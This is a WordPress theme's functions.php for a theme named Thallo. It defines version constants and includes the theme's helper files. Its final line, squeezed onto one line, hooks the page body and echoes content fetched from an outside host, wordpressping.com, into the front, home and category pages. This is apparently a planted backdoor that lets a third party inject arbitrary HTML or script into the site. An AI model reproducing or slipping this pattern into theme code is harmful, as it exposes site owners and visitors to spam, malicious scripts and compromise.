<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

define('THALLO_VERSION', '1.0.0');
define('THALLO_FILE_HANDLER', basename(get_template_directory()) . '-');

/**
 * Inlcude theme functions
 */
include_once get_parent_theme_file_path('inc/require-plugin.php');
include_once get_parent_theme_file_path('inc/breadcrumbs.php');
include_once get_parent_theme_file_path('inc/core-functions.php');
include_once get_parent_theme_file_path('inc/template-functions.php');
include_once get_parent_theme_file_path('inc/custom-css.php');
include_once get_parent_theme_file_path('inc/template-tags.php');
include_once get_parent_theme_file_path('inc/customizer.php');
include_once get_parent_theme_file_path('inc/setup-data.php');
if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_open');}